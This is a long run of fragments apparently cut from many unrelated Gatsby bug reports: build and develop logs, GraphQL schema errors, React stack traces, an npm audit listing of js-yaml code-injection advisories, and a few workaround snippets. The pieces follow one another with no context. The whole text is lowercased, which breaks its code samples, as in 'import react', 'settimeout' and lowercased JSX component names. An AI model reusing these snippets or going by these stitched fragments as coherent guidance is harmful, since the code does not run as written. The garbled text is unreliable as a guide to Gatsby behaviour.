to validate, run `yarn build` and you should see _zero_ warnings.
the file name is inserted as caption ### temporary workaround
you can insert a space between [ ], and then a space is shown instead, at least not visible.
yarn run v1.15.2
$ gatsby build
success open and validate gatsby-configs 0.004 s
success load plugins 0.239 s
success onpreinit 0.004 s
success delete html and css files from previous builds 0.010 s
success initialize cache 0.015 s
success copy gatsby files 0.037 s
success onprebootstrap 0.006 s
caught error: failed to process
httperror: response code 404 (not found)
error unhandled rejection error: failed to process httperror: response code 404 (not found) error command failed with exit code 1.
info visit for documentation about this command.
it appears layout.css is cached.
the order of items changes in mysterious ways that i'm not able to comprehend.
after scrolling the plugin details container, the plugin list container can not be scrolled unless a plugin is selected or the page is refreshed.
console output will show:
{ field_that_needs_to_be_sanitized_: null, _another__field_that_needs_to_be_sanitized: 'bar', _third_field_that_needs_to_be_sanitized: 'baz' } expected results
{ field_that_needs_to_be_sanitized_: \'foo\', _another__field_that_needs_to_be_sanitized: \'bar\', _third_field_that_needs_to_be_sanitized: \'baz\' } "field_that_needs_to_be_sanitized_" field resolves with "null" instead of value of "source[\'field_that_needs_to_be_sanitized?\']"
the image's cache key is unique to it's resource but does not take the selected source into account
this triggers queries for the cache key used by logic such as `seenbefore`, `wascached` and `imgloaded` to behave incorrectly when the viewport is resized
### details `inimagecache` method with the current pr would assign the first variant supplied as the run-time/instance cache key(different from actual browser image cache)
this should generally be ok, but would be invalid if the image changes due to a browser resize
`seenbefore` takes that value when adding an image to the page
when true, lazy-load will be skipped, as will any fade transition
this is unaffected by a screen resize, but i believe the run-time cache persists across navigation? in which case, if the viewport was later resized to trigger a different source, and the resource is mounted again, this could cause undesirable ux, more so if there were multiple instances of that image(less likely with art directed images?
another scenario would be dynamically adding the image to the same page after the initial load
`inimagecache` also impacts logic in `componentdidmount()` and `handleref(ref)`, a load event method is triggered in both that provides info if the asset was cached
it's not used by the actual component, but as a hook for a developer to utilize
`handleimageloaded()` is where the actual key is created
this may apply to the existing `gatsby-image` code too, but i don't think the browser will switch source unless a media query/attribute is present? thus the image currently only changes when mounted again which would also run into this issue
### resolution there's not much that can be done here? the key will be queried before the browser has been able to assign an appropriate source
the default `srcset` does provide `w`/`x` values that could be potentially parsed and matched by js querying the viewport/window, although for `w` sources, this would also need to take `sizes` attribute into account? further complicated when `media` is also part of source selection for art direction
image format is a non-issue as that shouldn't change and we don't need the url just an appropriate key to distinguish a different source
browsers may behave differently with source selection afaik, i have read that they can select a more appropriate source based on conditions such as network type/quality in use
with `gatsby-image` now having a proper browser image cache in place, where is this run-time cache useful? `seenbefore` appears to opt out of lazy-loading (how much of a benefit is that?) and disable fadein, which the browser cache support covers too iirc
that leaves `wascached` for those using it with an `onstartload` event.
images served from the static folder are not prefixed, and thus appear broken if your site is deployed to a subpath.
both applies styles even in screen mode.
build is not passing
the back button does nothing.
incorrect titles are captured
this is the same issue as discussed [here]( where the title is a page view behind because helmet hasn't had a chance to update the page title yet.
all contentful posts are interleaved with the files sourced from content.
build error: ```
success building production javascript and css bundles 5.380 s error building static html failed for path "/" see our docs page on debugging html builds for help 29 | 30 | function withprefix(path) {
> 31 | return normalizepath(__base_path__ + "/" + path); | ^ 32 | } 33 | 34 | function withassetprefix(path) { webpackerror: referenceerror: __base_path__ is not defined - index.js:31 withprefix [lib]/[gatsby-link]/index.js:31:1
error graphql error encountered 1 error(s):
- unknown field 'nexttitle' on type 'markdownremarkfields'
it is looking for `nexttitle` in the query above.
`nexttitle` field was added at line 27 of gatsby-node.js in the setfieldsongraphqlnodetype method with createnodefield.
it doesn't.
gatsby_1 | $ gatsby develop --host 0.0.0.0 --port 12800
gatsby_1 | success open and validate gatsby-configs 0.054 s
gatsby_1 | success load plugins 11.432 s
gatsby_1 | success onpreinit 0.017 s
gatsby_1 | success initialize cache 0.146 s
gatsby_1 | success copy gatsby files 0.878 s
gatsby_1 | success onprebootstrap 0.073 s
gatsby_1 | success source and transform nodes 0.416 s
gatsby_1 | success building schema 0.917 s
gatsby_1 | success createpages 0.121 s
gatsby_1 | success createpagesstatefully 0.235 s
gatsby_1 | success onpreextractqueries 0.022 s
gatsby_1 | success update schema 0.035 s
gatsby_1 | error graphql error unknown type "imagesharpfixed".
gatsby_1 | file: /app/.cache/fragments/image-sharp-fragments.js
gatsby_1 | 1 |
gatsby_1 | > 2 | fragment gatsbyimagesharpfixed on imagesharpfixed {
gatsby_1 | | ^
gatsby_1 | 3 | base64
gatsby_1 | 4 | width
gatsby_1 | 5 | height
gatsby_1 | 6 | src
gatsby_1 | 7 | srcset
gatsby_1 | 8 | }
gatsby_1 | 9 |
gatsby_1 | success extract queries from components 0.418 s
gatsby_1 | success run static queries 0.002 s
only "gatsby ssr" is logged since onrenderbody never executes
however, if the emotion plugin is removed from the console, the onrenderbody function executes and logs to the console as expected.
error cannot find module 'gatsby-theme-parent' error: cannot find module 'gatsby-theme-parent'
build fails.
only the second one does.
it doesn't load once cached safari
process hangs
it does not pass ### instructions we need to update some of our internal dependencies (and possibly pr upstream fixes) to update to js-yaml@3.13.1
specifically: ```
=== npm audit security report === # run npm update js-yaml --depth 7 to resolve 9 vulnerabilities
high code injection
package js-yaml
dependency of gatsby
path gatsby > babel-preset-gatsby > babel-plugin-macros >
cosmiconfig > js-yaml
more info
high code injection
package js-yaml
dependency of gatsby
path gatsby > eslint > js-yaml
more info
high code injection
package js-yaml
dependency of gatsby
path gatsby > eslint-plugin-graphql > graphql-config > js-yaml
more info
high code injection
package js-yaml
dependency of gatsby
path gatsby > optimize-css-assets-webpack-plugin > cssnano >
cosmiconfig > js-yaml
more info
high code injection
package js-yaml
dependency of gatsby
path gatsby > optimize-css-assets-webpack-plugin > cssnano >
cssnano-preset-default > postcss-svgo > svgo > js-yaml
more info
high code injection
package js-yaml
dependency of gatsby
path gatsby > postcss-loader > postcss-load-config > cosmiconfig
> js-yaml
more info
high code injection
package js-yaml
dependency of gatsby
path gatsby > yaml-loader > js-yaml
more info
high code injection
package js-yaml
dependency of gatsby-plugin-sharp
path gatsby-plugin-sharp > svgo > js-yaml
more info
high code injection
package js-yaml
dependency of gatsby-transformer-remark
path gatsby-transformer-remark > gray-matter > js-yaml
more info
``` we should just be able to run `ppm audit fix` in each of the starters to bump the resolved version(s) of js-yaml since it seems like most of our packages depend upon `js-yaml`@`3.13.0` which matches `3.13.1` as well.
build fails, showing the line `error cannot query field "localfile" on type "wordpress__pageacfhero_image" graphql/template-strings`
the admin-page address is hard-coded to `/admin`, so anybody wanting to use any other address is out of luck.
the build fails with this error: `graphql error field "src" must not have a selection since type "string" has no subfields.`
the red div is removed
a temporary fix is to put a dummy div above divs you care about so gatsby can alter it without issue.
it fails with: ```
error plugin gatsby-transformer-toml returned an error typeerror: createdigestcontent is not a function - gatsby-node.js:39 object.<anonymous> [specification]/[gatsby-transformer-toml]/gatsby-node.js:39:27 - generator.next error command failed with exit code 1.
the 404 page is served instead.
see description.
works on osx!
you see scss source maps are compiled but in firefox inspector you see a blob reference.
you see scss source maps are compiled but in chrome inspector you see an absolute path 3x.
you see scss source maps are compiled correctly and display correctly in chrome on linux.
got the following error on the 2nd and later run of `gatsby develop`: ```
the graphql query from gatsby-schema-cache-bug-repro/src/pages/index.js failed
errors: unknown argument "formatstring" on field "local_date" of type "syrevent"
graphql request (5:18) 4: name 5: local_date(formatstring: "mmmm dd, yyyy") ^ 6: } url path: /
context: {}
plugin: none
query: query pagequery { allsyrevent { nodes { name local_date(formatstring: "mmmm dd, yyyy") } } }
``` as a side-note, running `gatsby clean` and then spinning up the dev server again will resolve this for one time
running the dev server a 2nd time after this will break it again.
- gatsby develop
- gatsby-source-shopify begins to source and transforms nodes but freezes ```bash
vbi-store $ gatsby develop success open and validate gatsby-configs 0.025 s
success load plugins 0.212 s
success onpreinit 1.370 s
success initialize cache 0.199 s
success copy gatsby files 0.062 s
success onprebootstrap 0.895 s
gatsby-source-shopify/visuals-by-impulse starting to fetch data from shopify source and transform nodes
gatsby-source-shopify/visuals-by-impulse fetched and processed producttypes: 551.321ms
gatsby-source-shopify/visuals-by-impulse fetched and processed policies: 570.847ms
downloading remote files [==============================] 21/21 1.0 secs 100%
gatsby-source-shopify/visuals-by-impulse fetched and processed collections: 2024.666ms
source and transform nodesfailed to process remote content
source and transform nodesfailed to process remote content
source and transform nodesfailed to process remote content
source and transform nodesfailed to process remote content
source and transform nodesfailed to process remote content source and transform nodes
``` failed to process remote content varies from 0-10 items
- image gets cropped.
- placeholder is still 1:1 aspect ratio
errors randomly piping out of `stdout` and regular log output randomly piping out of `stderr`
- not restarted after error
$ gatsby clean
info deleting .cache, public
info successfully deleted directories
my error message renders due to the ```subsections``` being ```null```
![image]( image 2:
![image](
a blank screen with the following error is seen when loading up the netlify cms admin page: ```
cms.js:10 uncaught typeerror: cannot read property 'registerpreviewstyle' of undefined at object.<anonymous> (cms.js:10) at __webpack_require__ (bootstrap:19) at object.<anonymous> (bootstrap:83) at __webpack_require__ (bootstrap:19) at bootstrap:83 at bootstrap:83
error the graphql query from /users/myer/dev/gatsby-graphql-remark-not-null-filter/src/pages/index.js failed
errors: the "path" argument must be of type string
received type object graphql request (18:11) 17: title 18: image { ^ 19: childimagesharp { ,the "path" argument must be of type string
received type object graphql request (18:11) 17: title 18: image { ^ 19: childimagesharp { url path: /
context: {}
plugin: none
query: query usersmyerdevgatsbygraphqlremarknotnullfiltersrcpagesindexjs589306277 { site { sitemetadata { title description } } allmarkdownremark(sort: {fields: [frontmatter___date], order: desc}, filter: {frontmatter: {title: {ne: ""}, image: {ne: null}}}) { edges { node { excerpt fields { slug } frontmatter { date(formatstring: "mmmm dd, yyyy") title image { childimagesharp { fluid(maxwidth: 500) { src } } } } } } } }
page reloads at the top of the page, does not jump back even after waiting.
`localfile` was `null`.
`typeerror: cannot read property 'key' of null`
error plugin gatsby-plugin-flow returned an error error: /sandbox/node_modules/gatsby-plugin-flow/gatsby-node.js:1 (function (exports, require, module, __filename, __dirname) { export const onc reatebabelconfig = ({ ^^^^^^ syntaxerror: unexpected token export
after hot reloading index page is removed and server returns 404
the excerpt on the page includes a space before the exclamation point:
> this is my first post on my new fake blog !
i get text from the end of the blog post that isn't controlled by the `prunelength` at all.
it opens an empty tab with "data:text/plain," in the url bar.
if you one package.json you\'ll see "": "material-ui/core" in dependencies
i have patched it on my locak copy
i can prepare pull request with the patch.
empty white page and error in console: `typeerror: cannot read property 'tolocalestring' of undefined`
the style breaks <img width="1277" alt="screen shot 2019-03-04 at 11 08 12" src=" ">
only the first four load, the others hang.
`"auth":"some_user:some_pass"`
it's trying to show an image that's not available.
the header css class is missing on deployment.
404-development page is rendered and restarting application is required to fix.
webpackerror: typeerror: cannot read property 'islogin' of undefined
the file gets re-downloaded
you can confirm by checking the file mtime
secondly, i've confirmed with logging in createremotefilenode that the file is being re-downloaded.
everything goes smoothly until you find an error in your console > error while trying to use the following icon from the manifest: (resource size is not correct - typo in the manifest?)
the locally run project re-renders components: ![glitchy-gram](
`gatsby-remark-autolink-headers` plugin does not allow to change scroll update behavior via `shouldupdatescroll` function.
actually placeholder was not aligned.
showing just content from files that have longer name.
a `referenceerror: ___emotionjsx is not defined` is thrown
i was able to work around the issue by manually inserting the missing pragma import into the file: ```js
import { jsx as ___emotionjsx } from "@emotion/core";
``` or by amending the component to use `react.fragment` instead of the shorthand syntax.
`withprefix` adds a trailing slash which instead redirects to ` #some-id`
scroll is hijacked every time you try to scroll past one of the section that is wrapped in `scrollableanchor`.
[ { "value": "normal title", "depth": 1 }, { "value": null, <-------- "depth": 1 }
website looks totally different due to weird build/bundling behaviour
i only get a single value.
images are same size but wildly different
the image used by `gatsby-plugin-sharp.originalimg` and `gatsby-remark-images.linkimagestooriginal` is the same size as the source image but optimised and processed by sharp
$ ls -l content/blog/hello-world/salty_egg.jpg public//static/8058f3f26913fea3b6a89a73344fe94a/105fb/salty_egg.jpg -rw-r--r-- 1 md staff 684322 feb 16 20:05 content/blog/hello-world/salty_egg.jpg -rw-r--r-- 1 md staff 234323 feb 16 20:09 public//static/8058f3f26913fea3b6a89a73344fe94a/105fb/salty_egg.jpg $ file content/blog/hello-world/salty_egg.jpg public//static/8058f3f26913fea3b6a89a73344fe94a/105fb/salty_egg.jpg content/blog/hello-world/salty_egg.jpg: jpeg image data, exif standard: [tiff image data, little-endian, direntries=8, manufacturer=nokia], baseline, precision 8, 2048x1536, frames 3 public//static/8058f3f26913fea3b6a89a73344fe94a/105fb/salty_egg.jpg: jpeg image data, progressive, precision 8, 2048x1536, frames 3 ### suggested changes changing `originalimg` to provide a reference to an unmodified version of the original image file probably would break assumptions in existing code
adding something like `unprocessedimage` might minimise changes but increases api surface.
tags are inserted when the website is rendering in the browser
when inspecting the code in a browser you can see them appear.
"gatsby" in footer for is white
also, a big thank-you for all the amazing works you guys have done.
* page will not load -> returns above error.
* unsure how else to describe the issue.
`categories` was dropped from the node and doesn't end up in the graphql
xmlhttprequest.request.onreadystatechange
/users/admin/desktop/projects/webpack/bootstrap:52 49 | } else { 50 | // success 51 | try {
> 52 | var update = json.parse(request.responsetext); 53 | } catch (e) { 54 | reject(e); 55 | return;
view compiled
this screen is visible only in development
it will not appear if the app crashes in production.
open your browser developer console to further inspect this error.
fails with exception
reported upstream in
we should consider downgrading back to relay-compiler 1.
hmr is not working
query is not stripped, data is not available ### fix not sure what the _exact_ fix is, but it almost certainly some type of ast parsing issue in [this file](
classes are generated, but styles not applied.
strangely, the page is created, however the results are unexpected
- while on the dev 404 page, i can see my page in the list
if i click it, the page/component loads correctly.
- if i directly navigate to the page in my browser, i get the error: `cannot get /reference/mono-v6.x.x` there is nothing in logs about this, or in the browser console.
plugin overrode gatsby's build output.
i was expecting the blur up effect to work as the readme describes that it should: > using the "blur up" technique popularized by medium and facebook where a small 20px wide version of the image is shown as a placeholder until the actual image is downloaded.
error: names must match /^[_a-za-z][_a-za-z0-9]*$/ but "mongodbonetwo-threedocumentsconnectionsortbyfieldsenum" does not.
always `undefined`
all packages that implement cache await the response to make sure something gets stored with the correct key but then return what they passed to the cache instead of a response from the cache which is dangerous if there was ever a mismatch as subsequent cache.get could all be different than the initial value.
even when using`omitgooglefont: true` the development site still fetches the font from google fonts.
typeerror: can not read property 'id' of undefined
``` --- ##### more info it seems like changing ```js
emitter.on(`delete_page`, action => { const nodeid = createpageid(action.payload.path) const node = getnode(nodeid) boundactioncreators.deletenode({ node })
``` to use await ```js
emitter.on(`delete_page`, async action => { const nodeid = await createpageid(action.payload.path) const node = await getnode(nodeid) boundactioncreators.deletenode({ node })
``` fixes this issue [in the data bridge's gatsby-node]( #l154-l159)
i don't know why as i'm not familiar enough with the internal data bridge.
typeerror: cannot read property 'exclude' of undefined
at line 20, or [23]( #l23) non-transpiled.
running `gatsby develop` in `verbose` mode, provides this outut, which clearly shows something is not quite right: ```
route discovered : /wp/v2/sites/fmehu.wordpress.com/block-renderer/(?p<name>jetpack/mailchimp)
invalid route: detail route
route discovered : /wp/v2/sites/fmehu.wordpress.com/settings
excluded route: not whitelisted
route discovered : /wp/v2/sites/fmehu.wordpress.com/themes
excluded route: not whitelisted fetching the json data from 0 valid api routes...
``` querying the posts from the example `query` from the documentation: ```
{ "errors": [ { "message": "cannot query field \\"allwordpresspost\\" on type \\"query\\"
did you mean \\"allwordpressacfoptions\\" or \\"allwordpresssitemetadata\\"?", "locations": [ { "line": 2, "column": 3 } ] } ]
a blank page appears before the page starts rendering
### my thoughts on the problem i think that the registration of the serviceworker is blocking the react's render and that delaying it after everything is loaded should fix this
related:
see problem description.
png image format but jpg file extension
png did have slightly reduced filesize for the same dimensions but was still png data.
as outlined in the description, the pages never seem to be removed, and new pages builds with errors.
it says _(originally published at )_
a blank white page
here\'s the console errors: <img width="1275" alt="screen shot 2018-12-29 at 9 33 15 pm" src=" ">
fatal crash: see above
error is thrown: ```
unhandled rejection (typeerror): cannot read property 'injectstyles' of undefined
./node_modules/gatsby-plugin-typography/gatsby-browser.js.exports.oncliententry
node_modules/gatsby-plugin-typography/gatsby-browser.js:21
(anonymous function)
/home/sekhmet/workspace/tutorial-part-two/.cache/api-runner-browser.js:52
i can only see the target.sys.id
here's an example of the json string returned: ```
"childcontentfulrichtext": { "internal": { "content": "{\\"data\\":{},\\"content\\":[{\\"data\\":{},\\"content\\":[{\\"data\\":{},\\"content\\":[{\\"data\\":{},\\"content\\":[{\\"data\\":{},\\"marks\\":[],\\"value\\":\\"\\",\\"nodetype\\":\\"text\\"},{\\"data\\":{\\"target\\":{\\"sys\\":{\\"id\\":\\"c4ncwmtcqbgkokc0kuyiqgw\\",\\"type\\":\\"link\\",\\"linktype\\":\\"entry\\"}}},\\"content\\":[{\\"data\\":{},\\"marks\\":[],\\"value\\":\\"dialog\\",\\"nodetype\\":\\"text\\"}],\\"nodetype\\":\\"entry-hyperlink\\"},{\\"data\\":{},\\"marks\\":[],\\"value\\":\\"\\",\\"nodetype\\":\\"text\\"}],\\"nodetype\\":\\"paragraph\\"}],\\"nodetype\\":\\"list-item\\"},{\\"data\\":{},\\"content\\":[{\\"data\\":{},\\"content\\":[{\\"data\\":{},\\"marks\\":[],\\"value\\":\\"\\",\\"nodetype\\":\\"text\\"},{\\"data\\":{\\"target\\":{\\"sys\\":{\\"id\\":\\"q3ycw7wfmow8mwocg4yoc\\",\\"type\\":\\"link\\",\\"linktype\\":\\"entry\\"}}},\\"content\\":[{\\"data\\":{},\\"marks\\":[],\\"value\\":\\"link\\",\\"nodetype\\":\\"text\\"}],\\"nodetype\\":\\"entry-hyperlink\\"},{\\"data\\":{},\\"marks\\":[],\\"value\\":\\"\\",\\"nodetype\\":\\"text\\"}],\\"nodetype\\":\\"paragraph\\"}],\\"nodetype\\":\\"list-item\\"}],\\"nodetype\\":\\"unordered-list\\"},{\\"data\\":{},\\"content\\":[{\\"data\\":{},\\"marks\\":[],\\"value\\":\\"\\",\\"nodetype\\":\\"text\\"}],\\"nodetype\\":\\"paragraph\\"}],\\"nodetype\\":\\"document\\"}" }
the environment variable `api_key` from `.env.production` is used
## the fix i don't believe we can overwrite `node_env` as `production` is checked fairly often in various plugins/apis/etc
using `process.env.node_env = process.env.node_env || 'production'` in `gatsby-cli` seems to break the build
as such - i think there are two things that we should do here to remediate the issue
tweak [this code]( #l40) to check for an environment override _outside_ of `node_env` - perhaps `active_env` as we [document here]( #example-1)
tweak any documentation to make it clear that this new environment variable must be used if you want to use a separate .env file for a "production" build i don\'t love the indirection and extra steps here--but not sure i see a better solution off hand
opinions more than welcome here! cc @xjamundx
uncaught error is displayed
<kbd><img width="578" alt="screen shot 2018-12-17 at 11 34 14 pm" src=" " border="1"></kbd>
success open and validate gatsby-configs 0.008 s
success load plugins 0.286 s
success onpreinit 1.662 s
success delete html and css files from previous builds 0.195 s
success initialize cache 0.012 s
success copy gatsby files 0.090 s
success onprebootstrap 0.008 s
success source and transform nodes 0.090 s
success building schema 0.400 s
success createpages 0.170 s
success createpagesstatefully 0.035 s
success onpreextractqueries 0.004 s
success update schema 0.178 s
error names must match /^[_a-za-z][_a-za-z0-9]*$/ but "" does not
names must match /^[_a-za-z][_a-za-z0-9]*$/ but "" does not
names must match /^[_a-za-z][_a-za-z0-9]*$/ but "" does not
error: names must match /^[_a-za-z][_a-za-z0-9]*$/ but "" does not
names must match /^[_a-za-z][_a-za-z0-9]*$/ but "" does not
names must match /^[_a-za-z][_a-za-z0-9]*$/ but "" does not
- query-compiler.js:145 [gatsby-md]/[gatsby]/dist/internal-plugins/query-runner/query-compiler.js:14 5:44 - generator.next - debuggability.js:313 promise._execute [gatsby-md]/[bluebird]/js/release/debuggability.js:313:9 - promise.js:483 promise._resolvefromexecutor [gatsby-md]/[bluebird]/js/release/promise.js:483:18 - promise.js:79 new promise [gatsby-md]/[bluebird]/js/release/promise.js:79:10 - query-compiler.js:213 runner.write [gatsby-md]/[gatsby]/dist/internal-plugins/query-runner/query-compiler.js:21 3:7 - query-compiler.js:89 [gatsby-md]/[gatsby]/dist/internal-plugins/query-runner/query-compiler.js:89 :26 - generator.next error unhandled rejection error: names must match /^[_a-za-z][_a-za-z0-9]*$/ but "" does not
names must match /^[_a-za-z][_a-za-z0-9]*$/ but "" does not
names must match /^[_a-za-z][_a-za-z0-9]*$/ but "" does not
- query-compiler.js:145 [gatsby-md]/[gatsby]/dist/internal-plugins/query-runner/query-compiler.js:14 5:44 - generator.next - debuggability.js:313 promise._execute [gatsby-md]/[bluebird]/js/release/debuggability.js:313:9 - promise.js:483 promise._resolvefromexecutor [gatsby-md]/[bluebird]/js/release/promise.js:483:18 - promise.js:79 new promise [gatsby-md]/[bluebird]/js/release/promise.js:79:10 - query-compiler.js:213 runner.write [gatsby-md]/[gatsby]/dist/internal-plugins/query-runner/query-compiler.js:21 3:7 - query-compiler.js:89 [gatsby-md]/[gatsby]/dist/internal-plugins/query-runner/query-compiler.js:89 :26 - generator.next
thumbnail generation fails
`typeerror: cannot read property 'localfile' of null` localfile seems to get deleted by another localfile
rendering hooks are not called
we can't navigate between the tabs (moreover: the js is completely bricked).
taken to 404 page
successfully redirects me only after i refresh or if i open the link in a new tab.
the root (with routes) is remounted on every single transition.
we see the same as the `cropfocus: entropy` example
graphql errors out: "expected value of type \\"contentfulpage\\" but got: [object object]."
it does not handle the navigation request.
the global stylesheet pollutes every pages for the ssr.
_carbon-components style_
.bx--btn--primary { background-color: #3d70b2; border-width: 2px; border-style: solid; border-color: transparent; color: #fff;
} _styled-components style_
.buytmi { ~~color: blue;~~ ~~background-color: orange;~~
i got an error that the label is conflicting, when on the first build it is not conflicting
![image](
parentheses are dropped in gatsby's production build process.
no localfile field in the query.
white screen, and console shows `typeerror: props.image.localfile is null`
gatsby always serves the index page **_./src/pages/index.js_**
placeholder not fully shown.
border in background.
the share button is not aligned.
the drop down only goes away if you click the share button again.
see the error above.
one sees a blank page with a lot of 404s in the dev tools: ![image](
json.stringify can't handle it and crashes.
errors (described above).
`typeerror: t.props.page is null` the 'page' property being sent to markdownpagefooter component is null, and it is unable to get parent.relativepath because the remote plugin does not have a readme file within the gatsby project? it appears to be null because of the query in docsremotepackagestemplate passing markdownremark (null) to packagereadme
might be able to send the npm package url using the npmpackage instead of markdownremark here, but i'm not sure what the mutation in the sendreview function of markdownpagefooter is doing/expecting? maybe thumbs up/down should be hidden when `page` is null?
you're looking at the fabien0102 starter instead
the problem lies here: #l447-l453 using `repostub` as the slug is not unique.
webpackerror: ./.cache/api-runner-ssr.js 1 | var plugins = [{
> 2 | plugin: require(\'c:/users/shawna\'s laptop/desktop/hacktoberfest/hacktoberfest2018/node_modules/gatsby-plugin-styled-jsx/gatsby-ssr\'), | ^ 3 | options: {"plugins":[]},
``` >>>>> ![gatsbyerror_01](
![2gatsbyerror_01](
![gatsbyerror_03]( it has a carrot under the ' special character - it doesn't like it and wont compile and throws some red lettering command line
the rest of the code executes and we get different behavior than expected.
traced svg is from uncropped image, meaning all lines are at different places.
![image](
new page loads in weird state, loading icon never goes away and my macbook pro's fans turn on
can't immediately tell what is going on by looking at network tab.
some <p> have no classname at all.
they are misaligned, see this
table of contents include some unsanitised html
(see below) ![image](
![submit-a-starter](
rows are duplicates of the first row
**the wordpress rest api:**
"acf": { "builder": [ { "acf_fc_layout": "grid", "grid": [ { "acf_fc_layout": "text", "text": "<p>text 1</p>\ ", }, { "acf_fc_layout": "text", "text": "<p>another row, text 2</p>\ ", }, { "acf_fc_layout": "text", "text": "<p>another row, text 3</p>\ ", } ], } ],
**graphiql query:**
{ allwordpresspage(filter: { slug: { eq: "test"} }) { edges { node { id title slug acf { builder_page { __typename ...on wordpressacf_grid { id grid { id text } } } } } } }
``` **graphiql response:**
{ "data": { "allwordpresspage": { "edges": [ { "node": { "id": "270e0b30-05f3-5c06-87bc-fa47a0b9ed03", "title": "test", "slug": "test", "acf": { "builder_page": [ { "__typename": "wordpressacf_grid", "id": "270e0b30-05f3-5c06-87bc-fa47a0b9ed030builderwordpressacf_grid", "grid": [ { "id": "270e0b30-05f3-5c06-87bc-fa47a0b9ed030builderwordpressacf_gridgrid", "text": "<p>text 1</p>\ " }, { "id": "270e0b30-05f3-5c06-87bc-fa47a0b9ed030builderwordpressacf_gridgrid", "text": "<p>text 1</p>\ " }, { "id": "270e0b30-05f3-5c06-87bc-fa47a0b9ed030builderwordpressacf_gridgrid", "text": "<p>text 1</p>\ " } ] } ] } } } ] } }
navigated to `/public/public/page-2/` and got 404.
it does not.
uncaught referenceerror: require is not defined at eval (users/{user}/{path-to-app}/node_modules/graphql/jsutils/instanceof.mjs:34) at module../node_modules/graphql/jsutils/instanceof.mjs (commons.js:3856) at __webpack_require__ (commons.js:725) at fn (commons.js:102) at eval (users/{user}/{path-to-app}/node_modules/graphql/type/definition.mjs:46) at module../node_modules/graphql/type/definition.mjs (commons.js:4180) at __webpack_require__ (commons.js:725) at fn (commons.js:102) at eval (users/{user}/{path-to-app}/node_modules/graphql/type/validate.mjs:4) at module../node_modules/graphql/type/validate.mjs (commons.js:4252)
the data prop in the component is undefined
every image is read out twice as the screen reader first encounters the placeholder image and then the actual image
### suggested fix this issue can be reliably prevented through the use of `display:none` as elements with this does not get read out by screen readers
therefore, applying `display:none` to the main image until it is loaded, and then applying `display:none` to the placeholder image
here is my current workaround for the placeholder image part
i cannot also apply this fix to the main image whilst loading, as the `imgstyle` is applied to the placeholder as well
import react, { component } from 'react';
import img from 'gatsby-image'; class safeimg extends component { state = { placeholderextrastyle: {} }; onloadhandler = () => { const { onload } = this.props; settimeout(() => { this.setstate({ placeholderextrastyle: { display: 'none' } }); }, 500); if (onload) { onload(); } }; render() { const { placeholderstyle = {}, onload, ...props } = this.props; const { placeholderextrastyle } = this.state; return ( <img onload={this.onloadhandler} placeholderstyle={{ ...placeholderstyle, ...placeholderextrastyle }} {...props} /> ); }
} export default safeimg;
page does not navigate away
1:34:06 pm: success building production javascript and css bundles 11.416 s
1:34:07 pm: error building static html for pages failed
1:34:07 pm: see our docs page on debugging html builds for help
1:34:07 pm: 1:34:07 pm: webpackerror: invariant violation: minified react error #130; visit actjs.org/docs/error-decoder.html?invariant=130&args[]=object&args[]= for the full message or use the non-minified dev environment for full errors and addit ional helpful warnings.
1:34:07 pm: 1:34:07 pm: 1:34:07 pm: 1:34:07 pm: - bootstrap:24 a.render
1:34:07 pm: lib/webpack/bootstrap:24:1
1:34:07 pm: 1:34:07 pm: - bootstrap:21 a.read
1:34:07 pm: lib/webpack/bootstrap:21:1
1:34:07 pm: 1:34:07 pm: - bootstrap:32 rendertostring
1:34:07 pm: lib/webpack/bootstrap:32:1
1:34:07 pm: 1:34:07 pm: - static-entry.js:188 module../.cache/static-entry.js.__webpack_exports__.defa ult.react.component [as default]
1:34:07 pm: lib/.cache/static-entry.js:188:18
1:34:07 pm: 1:34:07 pm: - bootstrap:24 promise
1:34:07 pm: lib/webpack/bootstrap:24:1
blank page - happens whether a custom 404.js component exists in the pages directory or not.
console shows this error:
uncaught typeerror: cannot read property 'componentchunkname' of undefined at proxycomponent.render (users/kirk/projects/website_2.0/website/.cache/root.js:132) at proxycomponent.hotcomponentrender (users/kirk/projects/website_2.0/website/node_modules/react-hot-loader/dist/react-hot-loader.development.js:620) at proxycomponent.proxiedrender (users/kirk/projects/website_2.0/website/node_modules/react-hot-loader/dist/react-hot-loader.development.js:635) at finishclasscomponent (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:13194) at updateclasscomponent (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:13156) at beginwork (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:13825) at performunitofwork (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:15864) at workloop (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:15903) at htmlunknownelement.callcallback (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:100) at object.invokeguardedcallbackdev (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:138) at invokeguardedcallback (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:187) at replayunitofwork (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:15311) at renderroot (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:15963) at performworkonroot (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:16561) at performwork (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:16483) at performsyncwork (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:16455) at requestwork (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:16355) at schedulework$1 (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:16219) at schedulerootupdate (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:16786) at updatecontaineratexpirationtime (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:16813) at updatecontainer (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:16840) at reactroot.render (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:17123) at eval (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:17263) at unbatchedupdates (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:16680) at legacyrendersubtreeintocontainer (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:17259) at render (users/kirk/projects/website_2.0/website/node_modules/react-dom/cjs/react-dom.development.js:17318) at eval (users/kirk/projects/website_2.0/website/.cache/app.js:97)`
